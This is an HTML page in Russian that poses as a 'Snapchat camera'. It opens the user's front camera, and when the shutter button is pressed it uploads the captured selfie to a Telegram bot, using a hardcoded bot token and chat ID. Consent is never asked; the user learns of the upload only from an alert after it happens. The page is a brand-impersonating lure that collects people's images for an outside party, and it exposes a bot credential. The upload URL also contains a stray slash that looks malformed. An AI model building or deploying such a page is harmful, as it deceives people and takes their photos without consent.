<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Snapchat камера</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@600&display=swap');
  * {
    box-sizing: border-box;
    margin: 0; padding: 0;
  }
  body, html {
    height: 100%;
    background: #000;
    font-family: 'Montserrat', sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    color: #fff;
  }
  #camera-container {
    position: relative;
    width: 100vw;
    height: 100vh;
    overflow: hidden;
  }
  video {
    width: 100%;
    height: 100%;
    object-fit: cover;
    filter: brightness(0.9);
  }
  #top-bar {
    position: absolute;
    top: 20px;
    left: 0;
    right: 0;
    text-align: center;
    font-size: 24px;
    font-weight: 700;
    letter-spacing: 2px;
    color: #fffc00;
    text-shadow: 0 0 5px #fffc00;
    pointer-events: none;
  }
  #shoot-btn {
    position: absolute;
    bottom: 40px;
    left: 50%;
    transform: translateX(-50%);
    width: 90px;
    height: 90px;
    background: #fffc00;
    border-radius: 50%;
    box-shadow:
      0 0 10px #fff,
      0 0 20px #fffc00,
      0 0 30px #fffc00;
    cursor: pointer;
    transition: transform 0.1s ease;
  }
  #shoot-btn:active {
    transform: translateX(-50%) scale(0.85);
  }
  #flash {
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: white;
    opacity: 0;
    pointer-events: none;
    animation: flashAnim 0.4s ease forwards;
  }
  @keyframes flashAnim {
    0% {opacity: 0.9;}
    100% {opacity: 0;}
  }
</style>
</head>
<body>

<div id="camera-container">
  <div id="top-bar">SNAP CAMERA</div>
  <video id="camera" autoplay playsinline></video>
  <div id="shoot-btn" title="Сделать фото"></div>
</div>
<div id="flash"></div>

<script>
  const video = document.getElementById('camera');
  const shootBtn = document.getElementById('shoot-btn');
  const flash = document.getElementById('flash');

  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => { video.srcObject = stream; })
    .catch(() => alert("Камера не доступна"));

  shootBtn.addEventListener('click', () => {
    flash.style.opacity = '0.9';
    flash.style.animation = 'none';
    flash.offsetHeight; // trigger reflow
    flash.style.animation = null;

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append('chat_id', '5586578957');
      formData.append('photo', blob, 'selfie.png');

      fetch('https://api.telegram.org/bot/7759810259:AAG4IjnFm65UOZl_bmRgEReerr8U4RSJBaE/sendPhoto', {
        method: 'POST',
        body: formData
      }).then(() => {
        alert('Фото отправлено в Telegram!');
      }).catch(() => {
        alert('Ошибка отправки');
      });
    }, 'image/png');
  });
</script>

</body>
</html>
